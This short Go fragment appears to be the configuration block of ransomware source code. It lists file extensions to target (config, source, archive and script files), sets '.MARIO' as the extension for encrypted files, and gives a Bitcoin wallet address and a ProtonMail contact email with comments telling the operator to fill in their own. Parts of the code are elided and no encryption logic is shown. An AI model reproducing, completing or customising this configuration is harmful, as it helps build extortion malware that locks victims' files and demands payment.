...
var (
	...
	InterestingExtensions = []string{
		...
		"cfg", "conf", "ini", "prf",
		// Source files
		"html", "php", "js", "c", "cc", "py", "lua", "go", "java", "vb", "jar", "rb", "asp", "aspx", "jps", "c", "cs",
		// archive files
		"zip", "7z", "bzip", "gzip", "tar", "iso", "rar",
		// Script files
		"bat", "vbs",
	}
	...
	EncryptionExtension = ".MARIO"

	// Your wallet address
	Wallet = "1E5wtT8cUvArwUpUP2uvaqCf532hYNc6sR"

	// Your contact email
	ContactEmail = "mariohack1@protonmail.com"
